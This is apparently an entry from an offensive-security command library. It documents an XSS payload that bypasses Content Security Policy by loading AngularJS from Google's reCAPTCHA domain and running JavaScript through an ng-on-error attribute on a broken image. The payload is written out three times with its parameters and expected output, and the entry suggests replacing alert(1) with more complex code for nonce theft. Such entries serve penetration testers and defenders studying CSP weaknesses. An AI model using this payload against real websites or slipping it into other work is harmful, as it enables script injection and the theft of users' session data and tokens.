---
data: >-
  <script
  src='https://www.google.com/recaptcha/about/js/main.min.js'></script><img
  src=x ng-on-error='$event.target.ownerDocument.defaultView.alert(1)'>
tags:
  - csp-bypass
  - angularjs
type: command
output: Alert popup with '1'
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:07.583Z'
id: 366aa7c9-b1c0-4f40-aff9-5da840aa1837
verified: false
validated: true
submitted: true
---
# load-angularjs-script

## Command

```javascript
<script src='https://www.google.com/recaptcha/about/js/main.min.js'></script><img src=x ng-on-error='$event.target.ownerDocument.defaultView.alert(1)'>
```

## Description

Injects HTML to load AngularJS from Google's reCAPTCHA domain and demonstrates JS execution via ng-on-error directive on an erroneous img load, confirming Angular parsing without CSP violation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| src | URL of AngularJS script (https://www.google.com/recaptcha/about/js/main.min.js) | Yes |
| ng-on-error | Payload to execute on error ($event.target.ownerDocument.defaultView.alert(1)) | Yes |

## Examples

### Basic Usage

```javascript
<script src='https://www.google.com/recaptcha/about/js/main.min.js'></script><img src=x ng-on-error='$event.target.ownerDocument.defaultView.alert(1)'>
```

### Advanced Usage

Replace alert with more complex payload, e.g., for nonce theft.

## Expected Output

AngularJS loads successfully; alert(1) popup appears, indicating directive execution.

## Related

- [[commands/inject-angularjs-iframe]]
- [[procedures/Inject-AngularJS-for-CSP-Bypass]]
